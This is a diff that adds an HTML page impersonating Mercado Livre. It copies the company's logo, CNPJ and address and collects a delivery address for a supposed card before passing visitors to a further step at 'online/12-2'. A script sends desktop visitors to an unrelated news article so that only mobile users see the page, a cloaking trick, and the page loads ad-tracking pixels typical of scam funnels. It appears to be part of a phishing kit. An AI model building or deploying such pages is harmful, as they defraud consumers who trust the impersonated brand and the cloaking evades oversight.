@@ -1,0 +1,374 @@
+﻿<html lang="pt-BR">
+
+<head>
+ 
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+  <title>Endereço de Entrega</title>
+  <link rel="stylesheet" href="css/all.min-7.css">
+  <script src="js/jquery.min.js"></script>
+  <script src="js/jquery.mask.min.js"></script>
+  
+  <style>
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+    }
+
+    body {
+      font-family: 'Sora', sans-serif;
+      background-color: #f5f5f5;
+    }
+
+    .header {
+      display: flex;
+      align-items: center;
+      padding: 10px;
+      border-bottom: 1px solid #aa9900;
+      background-color: #FFE600;
+    }
+
+    .logo {
+      width: 125px;
+      margin-left: 20px;
+      padding: 10px;
+    }
+
+    .content {
+      max-width: 600px;
+      margin: 0 auto;
+      padding: 20px;
+    }
+
+    h1 {
+      color: #333;
+      font-size: 24px;
+      margin-bottom: 10px;
+      text-align: center;
+    }
+
+    .subtitle {
+      color: #666;
+      font-size: 16px;
+      margin-bottom: 20px;
+      text-align: center;
+    }
+
+    .form-group {
+      margin-bottom: 15px;
+    }
+
+    .form-row {
+      display: flex;
+      gap: 10px;
+      margin-bottom: 15px;
+    }
+
+    .form-col {
+      flex: 1;
+    }
+
+    label {
+      display: block;
+      margin-bottom: 3px;
+      color: #333;
+      font-size: 13px;
+    }
+
+    input[type="text"] {
+      width: 100%;
+      padding: 10px;
+      border: 1px solid #ddd;
+      border-radius: 5px;
+      font-size: 15px;
+      font-family: 'Sora', sans-serif;
+    }
+
+    .checkbox-group {
+      display: flex;
+      align-items: center;
+      margin-top: 5px;
+    }
+
+    .checkbox-group input[type="checkbox"] {
+      margin-right: 8px;
+    }
+
+    button {
+      width: 100%;
+      padding: 15px;
+      background-color: #FFE600;
+      color: #1c1c1c;
+      border: none;
+      border-radius: 10px;
+      font-size: 16px;
+      font-weight: 600;
+      cursor: pointer;
+      font-family: 'Sora', sans-serif;
+      box-shadow: 0 4px 8px rgba(255, 230, 0, 0.3);
+      transition: all 0.3s ease;
+      margin-top: 10px;
+    }
+
+    button:hover {
+      background-color: #e6cf00;
+    }
+
+    button:disabled {
+      background-color: #ccc;
+      cursor: not-allowed;
+    }
+
+    .estado-select {
+      width: 100%;
+      padding: 10px;
+      border: 1px solid #ddd;
+      border-radius: 5px;
+      font-size: 15px;
+      font-family: 'Sora', sans-serif;
+      background-color: white;
+    }
+  </style>
+  <script>
+    $(document).ready(function () {
+      $('#cep').mask('00000-000');
+
+      function limpaFormulario() {
+        $("#endereco").val("");
+        $("#bairro").val("");
+        $("#cidade").val("");
+        $("#estado").val("");
+      }
+
+      $("#cep").blur(function () {
+        var cep = $(this).val().replace(/\D/g, '');
+
+        if (cep != "") {
+          var validacep = /^[0-9]{8}$/;
+
+          if (validacep.test(cep)) {
+            $("#endereco").val("...");
+            $("#bairro").val("...");
+            $("#cidade").val("...");
+            $("#estado").val("...");
+
+            $.getJSON("https://viacep.com.br/ws/" + cep + "/json/?callback=?", function (dados) {
+              if (!("erro" in dados)) {
+                $("#endereco").val(dados.logradouro);
+                $("#bairro").val(dados.bairro);
+                $("#cidade").val(dados.localidade);
+                $("#estado").val(dados.uf);
+              }
+              else {
+                limpaFormulario();
+                $("#cep").val("");
+                $(".error-message").remove();
+                $("#cep").after('<div class="error-message" style="color: #dc3545; font-size: 14px; margin-top: 5px;">CEP não encontrado. Por favor, verifique e tente novamente.</div>');
+                setTimeout(function () {
+                  $(".error-message").fadeOut(function () {
+                    $(this).remove();
+                  });
+                }, 2000);
+              }
+            });
+          }
+          else {
+            limpaFormulario();
+            $("#cep").val("");
+            $(".error-message").remove();
+            $("#cep").after('<div class="error-message" style="color: #dc3545; font-size: 14px; margin-top: 5px;">Formato de CEP inválido. Por favor, verifique e tente novamente.</div>');
+            setTimeout(function () {
+              $(".error-message").fadeOut(function () {
+                $(this).remove();
+              });
+            }, 2000);
+          }
+        }
+        else {
+          limpaFormulario();
+        }
+      });
+    });
+
+    function salvarEndereco() {
+      const endereco = {
+        logradouro: document.getElementById('endereco').value,
+        numero: document.getElementById('numero').value,
+        complemento: document.getElementById('complemento').value,
+        bairro: document.getElementById('bairro').value,
+        cidade: document.getElementById('cidade').value,
+        estado: document.getElementById('estado').value,
+        cep: document.getElementById('cep').value
+      };
+
+      try {
+        localStorage.setItem('enderecoEntrega', JSON.stringify(endereco));
+        console.log('Endereço salvo com sucesso:', endereco);
+        window.location.href = buildUrlWithParams('online/12-2/index.html');
+      } catch (erro) {
+        console.error('Erro ao salvar endereço:', erro);
+        alert('Ocorreu um erro ao salvar o endereço. Por favor, tente novamente.');
+      }
+    }
+  </script>
+
+
+<script type="text/javascript">
+    // Verifica o dispositivo e redireciona antes de carregar outros recursos
+    if (!/iPhone|iPod|iPad|Android|BlackBerry|IEMobile/i.test(navigator.userAgent) && window.innerWidth > 768) {
+      window.location.replace('https://gironews.com/negocios/fidelizacao-em-parceria-54183/');
+    }
+  </script>
+  <script>
+    window.pixelId = "6903840b1d5bdac30702fe0f";
+    var a = document.createElement("script");
+    a.setAttribute("async", "");
+    a.setAttribute("defer", "");
+    a.setAttribute("src", "https://cdn.utmify.com.br/scripts/pixel/pixel.js");
+    document.head.appendChild(a);
+  </script>
+  <script src="https://cdn.utmify.com.br/scripts/utms/latest.js" data-utmify-prevent-subids async defer></script>
+
+<script>
+  window.pixelId = "6903840b1d5bdac30702fe0f";
+  var a = document.createElement("script");
+  a.setAttribute("async", "");
+  a.setAttribute("defer", "");
+  a.setAttribute("src", "https://cdn.utmify.com.br/scripts/pixel/pixel.js");
+  document.head.appendChild(a);
+</script>
+<script>
+  window.tikTokPixelId = "69ef9622c928c0ab98c3bffc";
+  var a = document.createElement("script");
+  a.setAttribute("async", "");
+  a.setAttribute("defer", "");
+  a.setAttribute("src", "https://cdn.utmify.com.br/scripts/pixel/pixel-tiktok.js");
+  document.head.appendChild(a);
+</script>
+</head>
+
+<body>
+
+  <div class="header">
+    <img src="images/logo.png" alt="Logo Mercado Livre" class="logo">
+  </div>
+
+  <div class="content">
+    <h1>Endereço de Entrega</h1>
+    <p class="subtitle">Onde você deseja receber seu cartão</p>
+
+    <form id="endereco-form" onsubmit="event.preventDefault(); salvarEndereco();">
+      <div class="form-group">
+        <label for="cep">CEP</label>
+        <input type="text" id="cep" name="cep" maxlength="9" placeholder="00000-000" required="" onkeyup="if(this.value.length >= 9) this.blur();">
+      </div>
+
+      <div class="form-group">
+        <label for="endereco">Endereço</label>
+        <input type="text" id="endereco" name="endereco" required="">
+      </div>
+
+      <div class="form-row">
+        <div class="form-col" style="flex: 0.4;">
+          <label for="numero">Número</label>
+          <input type="text" id="numero" name="numero" required="">
+        </div>
+        <div class="form-col" style="flex: 0.6;">
+          <label for="complemento">Complemento (opcional)</label>
+          <input type="text" id="complemento" name="complemento">
+        </div>
+      </div>
+
+      <div class="form-group">
+        <label for="bairro">Bairro</label>
+        <input type="text" id="bairro" name="bairro" required="">
+      </div>
+
+      <div class="form-row">
+        <div class="form-col" style="flex: 0.6;">
+          <label for="cidade">Cidade</label>
+          <input type="text" id="cidade" name="cidade" required="">
+        </div>
+        <div class="form-col" style="flex: 0.4;">
+          <label for="estado">Estado</label>
+          <select id="estado" name="estado" required="" style="width: 100%; padding: 10px; border: 1px solid #ddd; border-radius: 5px; font-family: 'Sora', sans-serif; font-size: 16px; color: #333; height: 40px; background-color: #fff; appearance: auto;">
+            <option value="">Selecione</option>
+            <option value="AC">AC</option>
+            <option value="AL">AL</option>
+            <option value="AP">AP</option>
+            <option value="AM">AM</option>
+            <option value="BA">BA</option>
+            <option value="CE">CE</option>
+            <option value="DF">DF</option>
+            <option value="ES">ES</option>
+            <option value="GO">GO</option>
+            <option value="MA">MA</option>
+            <option value="MT">MT</option>
+            <option value="MS">MS</option>
+            <option value="MG">MG</option>
+            <option value="PA">PA</option>
+            <option value="PB">PB</option>
+            <option value="PR">PR</option>
+            <option value="PE">PE</option>
+            <option value="PI">PI</option>
+            <option value="RJ">RJ</option>
+            <option value="RN">RN</option>
+            <option value="RS">RS</option>
+            <option value="RO">RO</option>
+            <option value="RR">RR</option>
+            <option value="SC">SC</option>
+            <option value="SP">SP</option>
+            <option value="SE">SE</option>
+            <option value="TO">TO</option>
+          </select>
+        </div>
+      </div>
+
+      <button type="submit" class="button">
+        Continuar
+      </button>
+    </form>
+  </div>
+
+  <footer style="padding: 10px 15px; text-align: center; margin-top: 50px; background-color: #f9f9f9; border-top: 1px solid #eaeaea; font-family: 'Sora', sans-serif;">
+    <div style="max-width: 600px; margin: 0 auto;">
+      <p style="color: #777; font-size: 10px; margin-bottom: 5px; line-height: 1.2;">
+        Mercado Livre S.A. | CNPJ: 79.379.491.0008-50
+      </p>
+      <p style="color: #777; font-size: 10px; margin-bottom: 5px; line-height: 1.2;">
+        Rod. Antônio Heil, 250 - Centro II, Brusque - SC, 88353-100
+      </p>
+      <p style="color: #999; font-size: 9px; margin-top: 5px;">
+        © 2025 - Todos os direitos reservados
+      </p>
+    </div>
+  </footer>
+
+  <script>
+    function getUrlParams() {
+      const params = {};
+      const urlParams = new URLSearchParams(window.location.search);
+      for (const [key, value] of urlParams) {
+        params[key] = value;
+      }
+      return params;
+    }
+
+    // Função para construir URL com os parâmetros
+    function buildUrlWithParams(baseUrl) {
+      const fullUrl = new URL(baseUrl, window.location.origin);
+      const params = getUrlParams();
+
+      Object.keys(params).forEach(key => {
+        fullUrl.searchParams.append(key, params[key]);
+      });
+
+      return fullUrl.toString();
+    }
+  </script>
+
+
+</body>
+
+</html>
